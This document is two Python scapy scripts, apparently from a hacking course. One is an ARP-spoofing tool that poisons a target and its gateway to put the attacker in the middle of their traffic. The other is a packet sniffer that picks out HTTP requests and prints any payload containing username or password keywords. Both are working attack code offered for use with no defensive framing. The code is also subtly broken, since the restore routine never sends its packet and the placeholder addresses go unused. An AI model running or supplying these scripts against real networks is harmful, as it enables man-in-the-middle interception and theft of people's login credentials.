#!/usr/bin/env python
import scapy.all as scapy
import time
import sys
def get_mac(ip):
 arp_request = scapy.ARP(pdst=ip)
 broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
 arp_request_broadcast = broadcast / arp_request
 answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
 return answered_list[0][1].hwsrc
def spoof(target_ip, spoof_ip):
 target_mac = get_mac(target_ip)
 packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
 scapy.send(packet, verbose=False)
def restore(destination_ip, source_ip):
 destination_mac = get_mac(destination_ip)
 source_mac = get_mac(source_ip)
 packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip,
hwsrc=source_mac)
 print(packet.show())
 print(packet.summary())
target_ip = "//your target's IP"
gateway_ip = "//your gateway"
try:
 packets_sent_count = 0
 while True:
 spoof("10.0.2.7", "10.0.2.1")
 spoof("10.0.2.1", "10.0.2.7")
 packets_sent_count = packets_sent_count + 2
 print("\r[+] Packets sent :" + str(packets_sent_count), end="")
 sys.stdout.flush()
 time.sleep(2)
except KeyboardInterrupt:
 print("\n[-] Detected CTRL + C ....Resetting ARP tables...Please wait.\n")
 restore(target_ip, gateway_ip)
 restore(gateway_ip, target_ip)
Code for Packet Sniffer
#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http
def sniff(interface):
 scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
def get_url(packet):
 return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
def get_login_info(packet):
 if packet.haslayer(scapy.Raw):
 load = packet[scapy.Raw].load
 keywords = ["username", "user", "login", "password", "pass"]
 for keyword in keywords:
 if keyword in load:
 return load
def process_sniffed_packet(packet):
 if packet.haslayer(http.HTTPRequest):
 url = get_url(packet)
 print("[+] HTTP Request >> " + url)
 login_info = get_login_info(packet)
 if login_info:
 print("\n\n [+] Possible username/password > " + login_info + "\n\n")
sniff("eth0")